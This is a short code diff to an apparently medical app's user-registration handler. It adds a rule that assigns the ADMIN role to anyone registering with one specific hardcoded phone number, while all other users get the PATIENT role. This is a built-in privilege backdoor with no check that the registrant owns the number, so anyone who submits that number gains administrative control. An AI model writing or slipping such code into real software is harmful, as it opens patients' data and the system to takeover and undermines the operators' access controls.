@@ -37,7 +37,7 @@ export async function login(req, res) {
 }
 
 /**
- * ✅ User Registration
+ * ✅ User Registration (with ADMIN override)
  */
 export async function register(req, res) {
   const { phone, name } = req.body;
@@ -53,9 +53,12 @@ export async function register(req, res) {
       return res.status(409).json({ success: false, error: 'User already exists' });
     }
 
+    // 🛠️ Automatically assign ADMIN role if phone is 9962074440
+    const role = phone === '9962074440' ? 'ADMIN' : 'PATIENT';
+
     const insert = await db.query(
       'INSERT INTO users (phone, name, role, registered_at) VALUES ($1, $2, $3, NOW()) RETURNING *',
-      [phone, name, 'PATIENT']
+      [phone, name, role]
     );
 
     const user = insert.rows[0];
